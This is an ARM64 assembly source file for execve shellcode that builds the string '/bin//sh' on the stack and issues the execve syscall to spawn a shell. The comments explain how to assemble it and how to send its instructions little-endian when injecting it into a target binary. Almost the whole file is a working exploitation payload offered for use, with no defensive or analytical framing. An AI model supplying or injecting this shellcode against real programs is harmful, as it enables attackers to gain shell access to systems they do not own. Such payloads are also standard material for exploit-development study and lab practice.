// Arm64 execve shellcode
// To test locally compile with 
// as execve.s -o execve.o
// ld execve.o -o execve

// For some reason when sending it as shellcode to a binary you have to have each set of 4 byte instructions sent in little endine format

.global _start
.section .text

_start:
	// Create room on the stack so the shellcode isn't messed with when writing the /bin//sh string
	add sp, sp, 0x120
	// execve syscall number
	mov x8, #221
	// filename
	movz x0, #0x622f
	movk x0, #0x6e69, lsl #16
	movk x0, #0x2f2f, lsl #32
	movk x0, #0x6873, lsl #48
	str xzr, [sp, #-4]
	str x0, [sp, #-8]
	sub x1, sp, #120
	add x0, x1, #112
	// argv
	mov x1, xzr
	// env
	mov x2, xzr
	svc #2468
